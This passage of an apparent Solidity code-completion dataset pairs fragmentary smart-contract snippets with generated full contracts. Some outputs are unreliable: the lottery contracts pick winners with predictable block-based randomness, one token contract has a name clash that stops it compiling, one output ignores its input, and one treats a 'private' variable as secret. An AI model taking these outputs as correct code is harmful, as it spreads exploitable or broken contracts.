        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // The token that the contract accepts\n    address public acceptedToken;\n\n    // Ensure the function is called with the accepted token\n    modifier acceptedTokenOnly(address from) {\n        require(msg.sender == acceptedToken, \"Not an accepted token\");\n        _;\n    }\n\n    // A function to handle purchase logic\n    function purchase(address from, uint tokensPaid) public {\n        // Implement your purchase logic here\n    }\n\n    // A function to handle received transfers\n    function onTransferReceived(\n        address from,\n        uint tokensPaid,\n        bytes4 selector\n    ) public acceptedTokenOnly(from) {\n        if (selector == this.purchase.selector) {\n            purchase(from, tokensPaid);\n        } else {\n            revert(\"Call of an unknown function\");\n        }\n    }\n\n    // Constructor to initialize accepted token\n    constructor (address _acceptedToken) public {\n        acceptedToken = _acceptedToken;\n    }\n}\n\n",
        "changed": 0
    },
    "672.sol": {
        "input": "pragma solidity >=0.5.0 <0.9.0;\n\ncontract Practice {\n    function arrLength(uint num) public pure returns(uint){\n        uint[] memory arr = new uint[](num);\n        for(uint i = 0; i < num; i++){\n            arr[i] = 10;\n        }\n        uint leng= arr.length;\n        return leng;\n        }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.5.0 <0.9.0;\n\ncontract Practice {\n    function arrLength(uint num) public pure returns(uint){\n        uint[] memory arr = new uint[](num);\n        for(uint i = 0; i < num; i++){\n            arr[i] = 10;\n        }\n        uint leng= arr.length;\n        return leng;\n        }\n}\n\n",
        "changed": 0
    },
    "674.sol": {
        "input": "function getUser(address _userAddress)\n        public\n        view\n        onlyAuthCaller\n        returns (\n            string memory name,\n            string memory info,\n            string memory role,\n        )\n    {\n        User memory tmpData = userDetails[_userAddress];\n        return (\n            tmpData.name,\n            tmpData.info,\n            tmpData.role\n        );\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct User {\n        string name;\n        string info;\n        string role;\n    }\n\n    address public authCaller;\n    mapping(address => User) public userDetails;\n\n    constructor() public {\n        authCaller = msg.sender;\n    }\n\n    modifier onlyAuthCaller() {\n        require(msg.sender == authCaller, \"Caller is not authorized\");\n        _;\n    }\n\n    function setUser(address _userAddress, string memory _name, string memory _info, string memory _role) public onlyAuthCaller {\n        User memory newUser;\n        newUser.name = _name;\n        newUser.info = _info;\n        newUser.role = _role;\n        userDetails[_userAddress] = newUser;\n    }\n\n    function getUser(address _userAddress)\n        public\n        view\n        onlyAuthCaller\n        returns (\n            string memory name,\n            string memory info,\n            string memory role\n        )\n    {\n        User memory tmpData = userDetails[_userAddress];\n        return (\n            tmpData.name,\n            tmpData.info,\n            tmpData.role\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "675.sol": {
        "input": "const DEFAULT_COMPILER_SETTINGS = {\n  version: '0.7.6',\n  settings: {\n    evmVersion: 'istanbul',\n    optimizer: {\n      enabled: true,\n      runs: 1_000_000,\n    },\n    metadata: {\n      bytecodeHash: 'none',\n    },\n  },\n}\n\nsolidity: {\n    compilers: [DEFAULT_COMPILER_SETTINGS],\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public data;\n\n    function set(uint x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "679.sol": {
        "input": "import \"prb-math/contracts/PRBMathSD59x18.sol\";\n\ncontract SimpleContract {\n\n    using PRBMathSD59x18 for int256;\n\n    function exponential_function(int256 x) public view returns (int256) {\n        int256 z = 90000000000000000;      \n        int256 a = 200000000000000000;     \n        int256 b = 1080000000000000000;    \n        int256 c = -10000000000000000000;  \n        int256 d = 100000000000000000;     \n        int256 _x = x * 1000000000000000000;\n        int256 outcome = PRBMathSD59x18.mul(a, b.pow(PRBMathSD59x18.mul(z, _x) + c)) + d;\n        return outcome;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "680.sol": {
        "input": "contract WavePortal {\n...\n constructor() payable {\n    console.log(\"Hello, Multiverse... I am Smart Contract WavePortal\");\n  }\n...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WavePortal {\n    event ContractDeployed(string message);\n    \n    constructor() payable {\n        emit ContractDeployed(\"Hello, Multiverse... I am Smart Contract WavePortal\");\n    }\n}\n\n",
        "changed": 0
    },
    "681.sol": {
        "input": "pragma solidity ^0.4.24;\n\ncontract balance {\n    address owner;\n    mapping(address => uint256) public balances;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function balanceIncrement(address _address) public returns (uint256){\n        require(owner == msg.sender, \"Only owner can increment balances\");\n        return balances[_address]++;\n    }\n\n    function balanceViewIncrement(address _address) public view returns (uint256 value){\n        value = balances[_address];\n        value++;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.24;\n\ncontract balance {\n    address owner;\n    mapping(address => uint256) public balances;\n\n    constructor() public {\n        //  If you declare variables - initialize them\n        owner = msg.sender;\n    }\n\n    //  Returns only if called from another function\n    function balanceIncrement(address _address) public returns (uint256){\n        //  If you initialize owner - check it\n        require(owner == msg.sender, \"Only owner can increment balances\");\n        return balances[_address]++;\n    }\n\n    //  Returns without modifying chain\n    function balanceViewIncrement(address _address) public view returns (uint256 value){\n        value = balances[_address];\n        value++;\n    }\n}\n\n",
        "changed": 0
    },
    "682.sol": {
        "input": "function transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\n    mapping (address => uint256) public balanceOf;\n    mapping (address => mapping (address => uint256)) public allowance;\n\n    function transfer(address to, uint256 amount) public returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"Not enough balance\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) public returns (bool) {\n        require(balanceOf[from] >= amount, \"Not enough balance\");\n        require(allowance[from][msg.sender] >= amount, \"Not enough allowance\");\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        allowance[from][msg.sender] -= amount;\n        return true;\n    }\n\n    function approve(address delegate, uint256 amount) public returns (bool) {\n        allowance[msg.sender][delegate] = amount;\n        return true;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balanceOf[account];\n    }\n\n    constructor() public {\n        balanceOf[msg.sender] = 10000;\n    }\n}\n\n",
        "changed": 1
    },
    "683.sol": {
        "input": "address owner;\n\naddress public owner;\n\ncontract Test {        \n    uint public firstVar=10;\n    uint secondVar=50;\n  }\n\n function returnOwner() public view returns (address){\n        return owner\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    address public owner;\n    uint public firstVar = 10;\n    uint private secondVar = 50;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function returnOwner() public view returns (address){\n        return owner;\n    }\n    \n    function getSecondVar() public view returns (uint){\n        require(msg.sender == owner, \"Only the owner can see the second variable\");\n        return secondVar;\n    }\n}\n\n",
        "changed": 0
    },
    "684.sol": {
        "input": "contract B {\n    A a = Test(0x123abc...);\n\n    funciton getAddressA() public view returns (address) {\n        return address(a); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract A {\n    // The definition of A goes here\n}\n\ncontract B {\n    A a = A(0x123abcABCabcABCabcABCabcABCabcABCabcABCab); // assuming 0x123abcABCabcABCabcABCabcABCabcABCabcABCab is the address of deployed contract A\n\n    function getAddressA() public view returns (address) {\n        return address(a); \n    }\n}\n\n",
        "changed": 0
    },
    "686.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Escrow {\n    address holder;\n    address admin;\n\n    receive() external payable {}\n\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == holder || msg.sender == admin);\n        payable(msg.sender).transfer(_amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Escrow {\n    address holder;\n    address admin;\n\n    receive() external payable {}\n\n    // only the holder and the admin contract\n    // can pull funds from this escrow account\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == holder || msg.sender == admin);\n        payable(msg.sender).transfer(_amount);\n    }\n}\n\n",
        "changed": 0
    },
    "687.sol": {
        "input": "function donate() public payable{\n  a.transfer(address(this).balance);\n    selfdestruct(owner);\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract DonationContract {\n    address payable public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n\n    function donate() public payable {\n        // Transfer all contract's balance to the owner\n        owner.transfer(address(this).balance);\n    }\n\n    function destructContract() public {\n        // Only the owner can destruct the contract\n        require(msg.sender == owner, \"Only the owner can destruct the contract\");\n        \n        // Destroy the contract and send all funds to the owner\n        selfdestruct(owner);\n    }\n}\n\n",
        "changed": 1
    },
    "688.sol": {
        "input": "function getStrings(uint startIndex, uint endIndex) view public returns (string[] memory) \n  { \n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string[] public stringsArray;\n    \n    constructor() public {\n        stringsArray.push(\"FirstString\");\n        stringsArray.push(\"SecondString\");\n        stringsArray.push(\"ThirdString\");\n        stringsArray.push(\"FourthString\");\n        stringsArray.push(\"FifthString\");\n    }\n    \n    function getStrings(uint startIndex, uint endIndex) view public returns (string[] memory) \n    { \n        require(startIndex <= endIndex && endIndex < stringsArray.length, \"Invalid index\");\n        \n        string[] memory result = new string[](endIndex - startIndex + 1);\n        \n        for (uint i = startIndex; i <= endIndex; i++) {\n            result[i - startIndex] = stringsArray[i];\n        }\n        \n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "690.sol": {
        "input": "using SafeMath for uint256;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: division by zero\");\n        uint256 c = a / b;\n\n        return c;\n    }\n}\n\ncontract MyContract {\n    using SafeMath for uint256;\n    uint256 public total;\n\n    function increment(uint256 value) public {\n        total = total.add(value);\n    }\n\n    function decrement(uint256 value) public {\n        total = total.sub(value);\n    }\n}\n\n",
        "changed": 0
    },
    "691.sol": {
        "input": "    mapping (uint => address) players;\n    uint playersCount=0;\n\nfunction enter() public payable {    \n            playersCount++;\n            players[playersCount]=payable(msg.sender);       \n        }               \n           \n\n       function pickWinner() public onlyowner returns (address payable) {\n            require(address(this).balance>0,\"Please upload balance\");\n            uint index = getRandomNumber() % playersCount;\n            address payable winner=payable(players[index]);\n            \n            lotteryHistory[lotteryId] = winner;\n            lotteryId++;\n    \n            for (uint i=0; i< playersCount ; i++) {\n                 delete players[i];\n            }     \n            return winner   ;   \n        }\n\n   lotteryId => playersCount => address\n\n  1 => playersCount => address\n\n 2 => playersCount => address\n\nfunction enter() public payable {    \n            playersCount++;\n            players[lotteryId][playersCount]=msg.sender;       \n        }         \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address public manager;\n    mapping (uint => address) private players;\n    mapping (uint => address) public lotteryHistory;\n    uint public playersCount = 0;\n    uint public lotteryId = 0;\n\n    modifier onlyManager() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    constructor() public {\n        manager = msg.sender;\n    }\n\n    function enter() public payable {    \n        playersCount++;\n        players[playersCount] = msg.sender;       \n    }\n\n    function getRandomNumber() private view returns(uint) {\n        return uint(keccak256(abi.encodePacked(block.timestamp, block.difficulty)));\n    }\n\n    function pickWinner() public onlyManager returns (address) {\n        require(address(this).balance > 0,\"Please upload balance\");\n        uint index = getRandomNumber() % playersCount + 1;\n        address winner = players[index];\n\n        lotteryHistory[lotteryId] = winner;\n        lotteryId++;\n\n        for (uint i = 1; i <= playersCount; i++) {\n            delete players[i];\n        }     \n\n        playersCount = 0;\n        return winner;   \n    }\n\n    function getBalance() public view returns(uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "692.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public storedData;\n\n    event DataStored(uint data);\n\n    constructor(uint initVal) public {\n        storedData = initVal;\n    }\n\n    function set(uint x) public {\n        storedData = x;\n\n        emit DataStored(x);\n    }\n\n    function get() public view returns (uint retVal) {\n        return storedData;\n    }\n}\n\n",
        "changed": 0
    },
    "693.sol": {
        "input": "function add_task(string memory _name) public {\n    tasksStruct memory newTask = tasksStruct(_name, uint32(now), false);\n    tasks.push(newTask);\n}\n\nfunction show_opened_tasks() public view returns (uint) {\n    uint count_of_opened_tasks = 0;\n    for (uint i=0; i<tasks.length; i++){\n        if (!tasks[i].is_done) {\n            count_of_opened_tasks += 1; \n        }\n    }\n    \n    return count_of_opened_tasks;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TaskManager {\n    struct Task {\n        string name;\n        uint32 creationTime;\n        bool isDone;\n    }\n\n    Task[] public tasks;\n\n    function addTask(string memory _name) public {\n        Task memory newTask = Task(_name, uint32(now), false);\n        tasks.push(newTask);\n    }\n\n    function showOpenedTasks() public view returns (uint) {\n        uint countOfOpenedTasks = 0;\n        for (uint i=0; i<tasks.length; i++){\n            if (!tasks[i].isDone) {\n                countOfOpenedTasks += 1; \n            }\n        }\n        \n        return countOfOpenedTasks;\n    }\n}\n\n",
        "changed": 0
    },
    "694.sol": {
        "input": "function send_usdt(address _to, uint256 _amount) external returns (string memory) {\n    IERC20 usdt = IERC20(address(0xfe4F5145f6e09952a5ba9e956ED0C25e3Fa4c7F1));\n    require(_amount > 1, \"Purchases must be higher than 1 usdt\");\n\n    usdt.transferFrom(msg.sender, owner, 1);\n    usdt.transferFrom(msg.sender, _to, _amount-1);\n\n    return \"Payment successful!\";  \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "696.sol": {
        "input": "AGGREGATOR_ADDRESS=0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e\n\nrequire(\"dotenv\").config();\nconst hre = require(\"hardhat\");\n\nasync function main() {\n    const factory = await hre.ethers.getContractFactory(\"Example\");\n    const contract = await factory.deploy(process.env.AGGREGATOR_ADDRESS);\n    await contract.deployed();\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\npragma solidity ^0.8;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract Example {\n    AggregatorV3Interface internal priceFeed;\n\n    constructor(address _aggregator) {\n        priceFeed = AggregatorV3Interface(_aggregator);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "697.sol": {
        "input": "\npragma solidity >=0.8.0 <0.9.0;\n\n\nlibrary BytesLib {  \n  function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                tempBytes := mload(0x40)\n\n                let lengthmod := and(_length, 31)\n\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    mstore(mc, mload(cc))\n                }\n\n                mstore(tempBytes, _length)\n\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            default {\n                tempBytes := mload(0x40)\n                mstore(tempBytes, 0)\n\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n}\n\n\n",
        "output": "\npragma solidity >=0.8.0 <0.9.0;\n\n\nlibrary BytesLib {  \n  function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        // Check length is 0. `iszero` return 1 for `true` and 0 for `false`.\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                // Get a location of some free memory and store it in tempBytes as\n                // Solidity does for memory variables.\n                tempBytes := mload(0x40)\n\n                // Calculate length mod 32 to handle slices that are not a multiple of 32 in size.\n                let lengthmod := and(_length, 31)\n\n                // tempBytes will have the following format in memory: <length><data>\n                // When copying data we will offset the start forward to avoid allocating additional memory\n                // Therefore part of the length area will be written, but this will be overwritten later anyways.\n                // In case no offset is require, the start is set to the data region (0x20 from the tempBytes)\n                // mc will be used to keep track where to copy the data to.\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    // Same logic as for mc is applied and additionally the start offset specified for the method is added\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    // increase `mc` and `cc` to read the next word from memory\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    // Copy the data from source (cc location) to the slice data (mc location)\n                    mstore(mc, mload(cc))\n                }\n\n                // Store the length of the slice. This will overwrite any partial data that \n                // was copied when having slices that are not a multiple of 32.\n                mstore(tempBytes, _length)\n\n                // update free-memory pointer\n                // allocating the array padded to 32 bytes like the compiler does now\n                // To set the used memory as a multiple of 32, add 31 to the actual memory usage (mc) \n                // and remove the modulo 32 (the `and` with `not(31)`)\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            // if we want a zero-length slice let's just return a zero-length array\n            default {\n                tempBytes := mload(0x40)\n                // zero out the 32 bytes slice we are about to return\n                // we need to do it because Solidity does not garbage collect\n                mstore(tempBytes, 0)\n\n                // update free-memory pointer\n                // tempBytes uses 32 bytes in memory (even when empty) for the length.\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n}\n\n",
        "changed": 0
    },
    "698.sol": {
        "input": "solidity: {\n   compilers: [\n     {\n        version: \"0.8.8\",\n      },\n      {\n         version: \"0.7.0\",\n      },\n     ],\n }\n  \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint data;\n\n    function set(uint x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "699.sol": {
        "input": "function divisionRoundUp(uint256 x, uint256 y) pure returns (uint256 z) {\n  z = (x + (y / 2) / y)\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MathOperations {\n    function divisionRoundUp(uint256 x, uint256 y) public pure returns (uint256 z) {\n        require(y > 0, \"Cannot divide by zero\");\n        z = (x + y - 1) / y;\n    }\n}\n\n",
        "changed": 0
    },
    "700.sol": {
        "input": "function withdraw(uint256 _amount) external {\n    balances[msg.sender] -= _amount;\n    (bool success, ) = payable(msg.sender).call{value: _amount}(\"\");\n}\n\n(bool success, ) = payable(msg.sender).call{value: _amount}(\"\");\nrequire(success);\n\nfunction withdraw(uint256 _amount) external {\n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => uint256) public balances;\n\n    event Withdrawal(address indexed _from, uint256 _amount);\n\n    constructor() public {\n        balances[msg.sender] = 10000;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint256 _amount) external {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance.\");\n        balances[msg.sender] -= _amount;\n\n        (bool success, ) = payable(msg.sender).call{value: _amount}(\"\");\n        require(success, \"Withdrawal failed.\");\n\n        emit Withdrawal(msg.sender, _amount);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return balances[msg.sender];\n    }\n}\n\n",
        "changed": 0
    },
    "701.sol": {
        "input": " function createUser( string memory _userName) public {\n    MyUser memory user;\n    user.publicKey = msg.sender;\n    user.userName = _userName;\n    users.push(user);\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct MyUser {\n        address publicKey;\n        string userName;\n    }\n\n    MyUser[] public users;\n\n    function createUser(string memory _userName) public {\n        MyUser memory user;\n        user.publicKey = msg.sender;\n        user.userName = _userName;\n        users.push(user);\n    }\n\n    function getUsers() public view returns(MyUser[] memory) {\n        return users;\n    }\n}\n\n",
        "changed": 0
    },
    "702.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract MyCollection is ERC721 {\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(msg.sender, 1);\n    }\n\n    bool locked = false;\n\n    function setLocked(bool _locked) external {\n        locked = _locked;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        require(!locked, \"Cannot transfer - currently locked\");\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "703.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Lottery {\n\n    address[] public s_players;\n\n    function enterLottery(uint tickets) public payable returns (address[] memory) {\n\n        uint lotteryCost = _tickets * 25 ether / 100;\n        address sender = msg.sender;\n        require(msg.value >= lotteryCost, 'Ticket cant be purchased');\n\n        for (uint x = 0; x < _tickets; x++){\n            s_players.push(payable(sender));\n            \n        }\n        \n        return s_players;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address public manager;\n    address[] public players;\n\n    constructor() {\n        manager = msg.sender;\n    }\n\n    function enterLottery(uint tickets) public payable returns (address[] memory) {\n        uint lotteryCost = tickets * 0.25 ether;\n        require(msg.value >= lotteryCost, 'Not enough Ether for tickets');\n\n        for (uint x = 0; x < tickets; x++){\n            players.push(msg.sender);\n        }\n        \n        return players;\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players)));\n    }\n\n    function pickWinner() public restricted {\n        require(players.length > 0, 'No players in lottery');\n        address payable winner = payable(players[random() % players.length]);\n        winner.transfer(address(this).balance);\n\n        players = new address[](0);\n    }\n\n    modifier restricted() {\n        require(msg.sender == manager, 'Only manager can call this');\n        _;\n    }\n\n    function getPlayers() public view returns (address[] memory) {\n        return players;\n    }\n}\n\n",
        "changed": 0
    },
    "704.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\ncontract t1{\n    mapping(address => uint256[]) AllSpecialNFT;\n    function addNewVal(address _off, uint _tokenId) public {\n        AllSpecialNFT[_off].push(_tokenId);\n    }\n    function findSize(address _off) public view returns(uint){\n        return AllSpecialNFT[_off].length;\n    }\n    \n}\npragma solidity >=0.4.22 <0.9.0;\nimport './t1.sol';\ncontract t2 {\n    t1 _t1;\n    constructor(t1 t1_){\n        _t1 = t1_;\n    }\n    \n    function callandAdd(uint _tokenId) public{\n        _t1.addNewVal(msg.sender,_tokenId);\n    }\n    \n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract t1 {\n    mapping(address => uint256[]) public AllSpecialNFT;\n    function addNewVal(address _off, uint _tokenId) public {\n        AllSpecialNFT[_off].push(_tokenId);\n    }\n    function findSize(address _off) public view returns(uint){\n        return AllSpecialNFT[_off].length;\n    }\n}\n\ncontract t2 {\n    t1 private _t1;\n    constructor(t1 t1_){\n        _t1 = t1_;\n    }\n    \n    function callandAdd(uint _tokenId) public{\n        _t1.addNewVal(msg.sender,_tokenId);\n    }\n}\n\n",
        "changed": 0
    },
    "705.sol": {
        "input": " enum VotingOption {\n    Confirmed,\n    Abstention\n}\n\nstruct Votes {\n    uint256 total;\n    uint256 totalPercentage;\n}\n\nstruct Elector {\n    address wallet;\n    VotingOption votingOption;\n    \n}\n\nstruct Candidate {\n    uint256 number;\n    string avatar;\n    Votes confirmedVotes;\n}\n\ncontract ElectronicVotingMachine {\n\nmapping (address => Elector) public electorsWhoVoted;\n\nVotes abstentionVotes = Votes({ total: 0, totalPercentage: 0 });\nElector[] electors;\nCandidate[] candidates;\nstring[] candidateAvatar = [\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n];\n\nfunction _createCandidates() private {\n    for(uint256 index = 0; index <= 6; index++) {\n        candidates.push(Candidate({\n            number: index + 1,\n            avatar: candidateAvatar[index],\n            confirmedVotes: Votes({ total: 0, totalPercentage: 0 })\n        }));\n    }\n}\n\nconstructor() {\n    _createCandidates();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ElectronicVotingMachine {\n    enum VotingOption {\n        Confirmed,\n        Abstention\n    }\n\n    struct Votes {\n        uint256 total;\n        uint256 totalPercentage;\n    }\n\n    struct Elector {\n        address wallet;\n        VotingOption votingOption;\n    }\n\n    struct Candidate {\n        uint256 number;\n        string avatar;\n        Votes confirmedVotes;\n    }\n\n    mapping (address => Elector) public electorsWhoVoted;\n\n    Votes abstentionVotes = Votes({ total: 0, totalPercentage: 0 });\n    Elector[] public electors;\n    Candidate[] public candidates;\n    string[] candidateAvatar = [\n        \"https://example.com/avatar1\",\n        \"https://example.com/avatar2\",\n        \"https://example.com/avatar3\",\n        \"https://example.com/avatar4\",\n        \"https://example.com/avatar5\",\n        \"https://example.com/avatar6\"\n    ];\n\n    function _createCandidates() private {\n        for(uint256 index = 0; index < 6; index++) {\n            candidates.push(Candidate({\n                number: index + 1,\n                avatar: candidateAvatar[index],\n                confirmedVotes: Votes({ total: 0, totalPercentage: 0 })\n            }));\n        }\n    }\n\n    constructor() public {\n        _createCandidates();\n    }\n}\n\n",
        "changed": 0
    },
    "706.sol": {
        "input": "if (userDetails[i].id == _id) {\n    userDetails[i] = userDetails[userDetails.length-1];\n    userDetails.pop();\n    break;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct UserDetail {\n        uint256 id;\n        string name;\n        string email;\n    }\n\n    UserDetail[] public userDetails;\n\n    function addUser(uint256 _id, string memory _name, string memory _email) public {\n        UserDetail memory newUser = UserDetail({\n            id: _id,\n            name: _name,\n            email: _email\n        });\n\n        userDetails.push(newUser);\n    }\n\n    function deleteUser(uint256 _id) public {\n        for(uint i = 0; i<userDetails.length; i++){\n            if (userDetails[i].id == _id) {\n                userDetails[i] = userDetails[userDetails.length-1];\n                userDetails.pop();\n                break;\n            }\n        }\n    }\n\n    function getUsers() public view returns (UserDetail[] memory) {\n        return userDetails;\n    }\n}\n\n",
        "changed": 0
    },
    "707.sol": {
        "input": "compilers: {\n    solc: {\n      version: \"0.8.4\",\n\n    }\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public myString;\n\n    function setMyString(string memory _myString) public {\n        myString = _myString;\n    }\n\n    function getMyString() public view returns (string memory) {\n        return myString;\n    }\n}\n\n",
        "changed": 0
    },
    "708.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Info {\n        uint64 lastused;\n        uint256 limit;\n        string comment;\n        address[] allowedTo;\n    }\n\n    mapping (address => Info) public users;\n\n    function setUser(address user, uint64 lastused, uint256 limit, string calldata comment, address[] calldata allowedTo) external {\n        users[user] = Info(lastused, limit, comment, allowedTo);\n    }\n}\n\nfunction getAllowedTo(address user) external view returns (address[] memory) {\n    return users[user].allowedTo;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Info {\n        uint64 lastused;\n        uint256 limit;\n        string comment;\n        address[] allowedTo;\n    }\n\n    mapping (address => Info) public users;\n\n    function setUser(address user, uint64 lastused, uint256 limit, string calldata comment, address[] calldata allowedTo) external {\n        users[user] = Info(lastused, limit, comment, allowedTo);\n    }\n\n    function getAllowedTo(address user) external view returns (address[] memory) {\n        return users[user].allowedTo;\n    }\n}\n\n",
        "changed": 0
    },
    "709.sol": {
        "input": "struct Game {\n    address host; \n    uint gameId; \n    uint buyinRequirement; \n    uint etherWithdrawalReqs; \n    uint gamePot; \n    uint8 tableWithdrawalReqs; \n    uint8 playerCount; \n    uint8 verifiedWithdrawalReqs; \n    bool endedBuyin; \n    bool isActive; \n    address[] playerList; \n}\n\nfunction startGame(string memory name, uint buyinReq) public payable isNotInGame {     \n    require(initFee == .001 ether, \"In order to prevent spam games that never resolve, each game initialization will cost  ether.\");\n    addFeesPending();\n    playerInfo[msg.sender] = Player(name, gameNumber, 0, 0, false, false, false, false, true);\n    address[] memory add;\n    idToGame[gameNumber] = Game(msg.sender, gameNumber, buyinReq, 0, 0, 0, 0, 0, false, true, add);\n    idToGame[gameNumber].playerList.push(msg.sender);\n    games.push(idToGame[gameNumber]);\n    incGameNumber();\n}    \n\nfunction getGameInfo(uint id) public view returns (Game memory) {\n    return idToGame[id];\n}\n\n\n",
